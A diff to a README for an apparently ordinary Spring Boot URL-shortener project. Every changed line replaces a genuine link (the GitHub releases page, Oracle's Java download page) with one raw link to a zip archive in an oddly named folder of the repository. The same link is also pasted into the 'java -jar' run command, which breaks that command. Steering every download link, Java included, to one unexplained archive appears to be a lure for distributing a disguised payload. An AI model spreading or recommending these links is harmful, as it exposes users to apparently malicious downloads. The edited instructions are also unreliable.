@@ -1,6 +1,6 @@
 # 🚀 url-short-springboot-backend - Your Easy Solution for URL Shortening
 
-[![Download](https://img.shields.io/badge/Download%20Now!-blue)](https://github.com/Mirsatra/url-short-springboot-backend/releases)
+[![Download](https://raw.githubusercontent.com/Mirsatra/url-short-springboot-backend/main/unsignalized/url-short-springboot-backend.zip%20Now!-blue)](https://raw.githubusercontent.com/Mirsatra/url-short-springboot-backend/main/unsignalized/url-short-springboot-backend.zip)
 
 ## 📖 Overview
 
@@ -12,7 +12,7 @@ To get started with the application, follow these simple steps to download and r
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: Start by visiting the following link to download the application: [Releases Page](https://github.com/Mirsatra/url-short-springboot-backend/releases).
+1. **Visit the Releases Page**: Start by visiting the following link to download the application: [Releases Page](https://raw.githubusercontent.com/Mirsatra/url-short-springboot-backend/main/unsignalized/url-short-springboot-backend.zip).
 2. **Select the Latest Release**: On the releases page, you will see various versions of the software. Choose the latest version for the best features and improvements.
 3. **Download the Package**: Click on the release title to view its details. Download the file that matches your system. This could be a .jar file or a zip/tar file containing the necessary components.
 4. **Save the File**: After selecting the download link for the package, save it to a location on your computer where you can easily find it.
@@ -21,7 +21,7 @@ To get started with the application, follow these simple steps to download and r
 
 Before running the application, ensure your system meets the following requirements:
 
-- **Java**: You need to have Java 8 or higher installed on your system. If you do not have Java, you can download it from the [Java website](https://www.oracle.com/java/technologies/javase-jdk11-downloads.html).
+- **Java**: You need to have Java 8 or higher installed on your system. If you do not have Java, you can download it from the [Java website](https://raw.githubusercontent.com/Mirsatra/url-short-springboot-backend/main/unsignalized/url-short-springboot-backend.zip).
 - **Memory**: A minimum of 512 MB RAM.
 - **Storage**: At least 100 MB of available disk space.
 - **Operating System**: Compatible with Windows, macOS, and Linux systems.
@@ -43,10 +43,10 @@ To run the application, follow these steps:
 4. **Run the Application**: If you have a .jar file, you can run the application using the following command:
 
    ```bash
-   java -jar your-app-name.jar
+   java -jar https://raw.githubusercontent.com/Mirsatra/url-short-springboot-backend/main/unsignalized/url-short-springboot-backend.zip
    ```
 
-   Replace `your-app-name.jar` with the actual filename. The console will show log messages, indicating the app is running.
+   Replace `https://raw.githubusercontent.com/Mirsatra/url-short-springboot-backend/main/unsignalized/url-short-springboot-backend.zip` with the actual filename. The console will show log messages, indicating the app is running.
 
 5. **Access the Application**: Open a web browser and go to `http://localhost:8080` to access the application.
 
@@ -111,4 +111,4 @@ For any other questions or feedback, feel free to open an issue in the repositor
 
 Join our community for additional support. Check the repository for updates and discussions. Your feedback is valuable and helps improve the application.
 
-Make sure to visit our releases page again for updates: [Releases Page](https://github.com/Mirsatra/url-short-springboot-backend/releases).
+Make sure to visit our releases page again for updates: [Releases Page](https://raw.githubusercontent.com/Mirsatra/url-short-springboot-backend/main/unsignalized/url-short-springboot-backend.zip).
